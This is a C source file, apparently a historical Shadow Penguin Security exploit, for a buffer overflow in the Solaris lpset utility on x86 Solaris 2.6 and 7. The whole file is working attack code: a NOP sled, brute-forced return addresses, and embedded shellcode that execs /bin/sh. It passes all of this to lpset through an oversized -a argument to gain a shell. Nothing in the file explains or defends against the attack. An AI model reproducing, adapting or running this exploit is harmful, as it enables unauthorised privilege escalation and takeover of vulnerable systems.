/*===================================================================
   ex_lpset.c Overflow Exploits( for Intel Edition )
   The Shadow Penguin Security (http://base.oc.to:/skyscraper/byte/551)
   Written by UNYUN (unewn4th@usa.net)
 =====================================================================
*/
#define OFFSET      0x3b88
#define STARTADR    700
#define ENDADR      1200
#define EX_STADR    8000
#define BUFSIZE     22000
#define NOP 0x90

unsigned long ret_adr;
int i,adjust;

char exploit_code[] =
"\xeb\x18\x5e\x33\xc0\x33\xdb\xb3\x08\x2b\xf3\x88\x06\x50\x50\xb0"
"\x17\x9a\xff\xff\xff\xff\x07\xee\xeb\x05\xe8\xe3\xff\xff\xff\x55"

"\x8b\xec\x83\xec\x08\xeb\x50\x33\xc0\xb0\x3b\xeb\x16\xc3\x33\xc0"
"\x40\xeb\x10\xc3\x5e\x33\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88\x7e"
"\x06\xeb\x05\xe8\xec\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f\xc3"
"\x5e\x33\xc0\x89\x76\x08\x88\x46\x07\x89\x46\x0c\x50\x8d\x46\x08"
"\x50\x8b\x46\x08\x50\xe8\xbd\xff\xff\xff\x83\xc4\x0c\x6a\x01\xe8"
"\xba\xff\xff\xff\x83\xc4\x04\xe8\xd4\xff\xff\xff/bin/sh";

unsigned long get_sp(void)
{
  __asm__(" movl %esp,%eax ");
}

static char   x[BUFSIZE];

main(int argc, char **argv)
{
        memset(x,NOP,18000);
        ret_adr=get_sp()-OFFSET;
        printf("0 : x86 Solaris2.6 J\n1 : ?\n2 : ?\n3 : x86 Solaris 7 J\n");
        printf("Input (0-3) : "); scanf("%d",&adjust);
        printf("Jumping Address = 0x%lx\n",ret_adr);
        for (i = adjust+STARTADR; i<ENDADR ; i+=4){
                x[i+2]=ret_adr & 0xff;
                x[i+3]=(ret_adr >> 8 ) &0xff;
                x[i+0]=(ret_adr >> 16 ) &0xff;
                x[i+1]=(ret_adr >> 24 ) &0xff;
        }
        for (i=0;i<strlen(exploit_code);i++)
                x[i+EX_STADR]=exploit_code[i];
        x[5000]='=';
        x[18000]=0;
        execl("/usr/bin/lpset","lpset","-n","xfn","-a",x,"lpcol1",(char *) 0);
}

